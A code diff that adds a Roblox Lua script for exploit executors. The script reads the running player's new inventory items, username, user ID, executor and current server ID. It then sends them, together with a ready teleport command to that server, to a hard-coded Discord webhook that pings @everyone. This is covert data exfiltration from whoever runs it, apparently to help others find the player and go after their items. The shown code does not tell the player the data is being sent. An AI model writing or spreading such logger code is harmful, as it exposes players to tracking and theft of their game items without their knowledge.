@@ -1,35 +1,120 @@
-local function createWebhookData(itemNames)
+local HttpService = game:GetService("HttpService")
+local inventory = game.Players.LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Weapons.Items
+local container = inventory.Container
+
+-- Table to store all the children recursively
+local allChildren = {}
+
+-- Recursive function to get all children
+local function getAllChildren(parent)
+    local children = parent:GetChildren()
+
+    for _, child in pairs(children) do
+        table.insert(allChildren, child)
+        if #child:GetChildren() > 0 then
+            getAllChildren(child)
+        end
+    end
+end
+
+-- Start recursion
+getAllChildren(container)
+
+-- Detect executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+        or (secure_load and "Sentinel")
+        or (pebc_execute and "ProtoSmasher")
+        or (KRNL_LOADED and "Krnl")
+        or (is_sirhurt_closure and "SirHurt")
+        or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
+        or "Unsupported"
+    return executor
+end
+
+-- Create webhook data
+local function createWebhookData(itemNames, serverId)
     local webhookcheck = detectExecutor()
     local LocalPlayer = game.Players.LocalPlayer
-    local jobId = game.JobId
+    local jobId = serverId
     local placeId = game.PlaceId
     local username = LocalPlayer.Name
 
+    -- Create the teleport script
     local teleportScript = string.format(
         'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
         placeId, jobId
     )
 
     local data = {
+        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
         ["content"] = "@everyone 🚨 New items detected! 🚨",
         ["embeds"] = {
             {
                 ["author"] = {
-                    ["name"] = "🎉 Items from " .. username,
-                    ["url"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
+                    ["name"] = "🎉 New Items Detected 🎉",
+                    ["url"] = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile",
                 },
                 ["description"] = string.format(
-                    "**New Items:**\n%s\n\n**Executor:** %s\n\n**Join this server using this script:**```lua\n%s\n```",
-                    itemNames, webhookcheck, teleportScript
+                    "**New Items:**\n%s\n\n**Executor:** %s\n\n**Player:** [%s](https://www.roblox.com/users/%s/profile)\n\n**Teleport Script:**```lua\n%s\n```",
+                    itemNames,
+                    webhookcheck,
+                    username,
+                    LocalPlayer.UserId,
+                    teleportScript
                 ),
                 ["type"] = "rich",
                 ["color"] = tonumber("0xFFD700"),
                 ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
-                },
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=150&height=150&format=png"
+                }
             }
         }
     }
-
     return HttpService:JSONEncode(data)
 end
+
+-- Send webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    if request then
+        request({
+            Url = webhookUrl,
+            Body = data,
+            Method = "POST",
+            Headers = headers
+        })
+    else
+        warn("No HTTP request function available!")
+    end
+end
+
+-- Process and send
+local function processChildren()
+    local newItemNames = {}
+
+    for _, child in pairs(allChildren) do
+        if child.Name == "NewItem" then
+            local itemNameLabel = child:FindFirstChild("ItemName")
+            if itemNameLabel and itemNameLabel:FindFirstChild("Label") then
+                local itemNameText = itemNameLabel.Label.Text
+                table.insert(newItemNames, "⭐ " .. itemNameText)
+            end
+        end
+    end
+
+    if #newItemNames > 0 then
+        local itemNames = table.concat(newItemNames, "\n")
+        local webhookUrl = "https://discord.com/api/webhooks/1366474373761863822/49Y-W-nX58NJGRZe5RfoDGZcmUXRnUInIlY4ycXiiB_lH2B33WRoS5lPcrxGfYaitLpO"
+        local serverId = game.JobId
+        local webhookData = createWebhookData(itemNames, serverId)
+        sendWebhook(webhookUrl, webhookData)
+    end
+end
+
+-- Start
+processChildren()
